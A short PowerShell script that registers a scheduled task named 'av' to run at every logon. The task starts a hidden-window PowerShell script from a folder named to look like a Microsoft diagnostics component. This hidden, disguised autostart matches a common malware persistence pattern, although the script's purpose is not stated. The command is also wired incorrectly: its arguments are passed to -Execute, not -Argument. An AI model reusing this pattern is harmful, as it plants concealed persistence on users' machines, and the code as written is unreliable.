$taskName = "av"
$taskExists = Get-ScheduledTask | Where-Object {$_.TaskName -eq $taskName}

if ($taskExists) {
    Write-Host "Task [$taskName] exists"
} else {
    Write-Host "Task [$taskName] does not exist"
    Write-Host "Making a basic task..."
    $powerShellCommand = 'powershell.exe -WindowStyle Hidden -File "C:\Program Files (x86)\MS-Diagnostics\diagnostics-update.ps1"'
    $taskAction = New-ScheduledTaskAction -Execute $powerShellCommand
    $taskTrigger = New-ScheduledTaskTrigger -AtLogon
    Register-ScheduledTask -Action $taskAction -Trigger $taskTrigger -TaskName $taskName -Description "YourTaskDescription"
}
